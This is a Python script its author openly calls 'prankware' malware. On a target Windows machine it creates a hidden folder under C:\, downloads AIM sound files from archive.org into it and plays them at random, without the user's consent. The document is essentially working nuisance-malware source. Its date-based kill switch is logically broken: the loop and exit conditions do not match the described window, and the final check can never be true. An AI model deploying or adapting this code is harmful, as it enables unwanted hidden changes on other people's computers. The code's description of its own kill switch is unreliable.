#!/usr/bin/python3
# __  __  _____   ___   ___  ______  ______   ______  ______  ______
#/_/\/_/\/_____/\/___/\/__/\/_____/\/_____/\ /_____/\/_____/\/_____/\
#\ \ \ \ \:::_:\ \::.\ \\ \ \::::_\/\:::_ \ \\::::_\/\::::_\/\:::_ \ \
# \:\_\ \ \  _\:\|\:: \/_) \ \:\/___/\:(_) ) )\:\/___/\:\/___/\:\ \ \ \
#  \::::_\/ /::_/__\:. __  ( (\::___\/\: __ `\ \_::._\:\::___\/\:\ \ \ \
#    \::\ \ \:\____/\: \ )  \ \\:\____/\ \ `\ \ \/____\:\:\____/\:\/.:| |
#     \__\/  \_____\/\__\/\__\/ \_____\/\_\/ \_\/\_____\/\_____\/\____/_/ V1.0
#
# Y2KERSED is "prankware" developed by Kersed. This malware makes the
# target Windows system randomly play AIM audio files from the 90s and early 00s.
# Kill switch can be enabled by setting system clock between
# 2000-01-01 00:00:00 and 2000-01-02 00:00:00.
#

import os
import string
import time
import datetime
import requests
import random
from random import randint
from playsound import playsound

#Audio file source URLs
audio_url_list = ["https://archive.org/download/im_20191103/BuddyIn.wav",
                  "https://archive.org/download/im_20191103/BuddyOut.wav",
                  "https://archive.org/download/im_20191103/You%27ve%20Got%20Mail.wav",
                  "https://archive.org/download/im_20191103/IM.wav"]

#Kill check
kill_check = datetime.datetime.now()
start = datetime.datetime.strptime("01-01-2000", "%d-%m-%Y")
end = datetime.datetime.strptime("02-01-2000", "%d-%m-%Y")

#Run Y2KAudioPlugin
while start <= kill_check >= end:

    #Download sound folder
    if not os.path.exists(r"C:\\Y2KAudioPlugin"):

        #Create hidden folder
        os.chdir("C:\\")
        os.mkdir("Y2KAudioPlugin")
        os.system("attrib +h Y2KAudioPlugin")
        os.chdir("C:\\Y2KAudioPlugin")
        directory = os.getcwd()

        #Download WAVs to hidden folder
        for url in audio_url_list:
            filename = directory + "\\" + random.choice(string.ascii_letters) + ".wav"
            r = requests.get(url)
            with open(filename, 'wb') as f:
                f.write(r.content)

    #Play sound files
    if start <= kill_check >= end:
        sound_path = r"C:\\Y2KAudioPlugin"
        sound_files = os.listdir(sound_path)
        sound_file = random.choice(sound_files)
        full_sound_path = str(sound_path + "\\" + sound_file)
        playsound(full_sound_path)
        time.sleep(randint(0, 5))  #Delay between sounds
        kill_check = datetime.datetime.now()

    #Kill check terminate
    else:
        quit()

#Kill check terminate
if start >= kill_check >= end:
    quit()
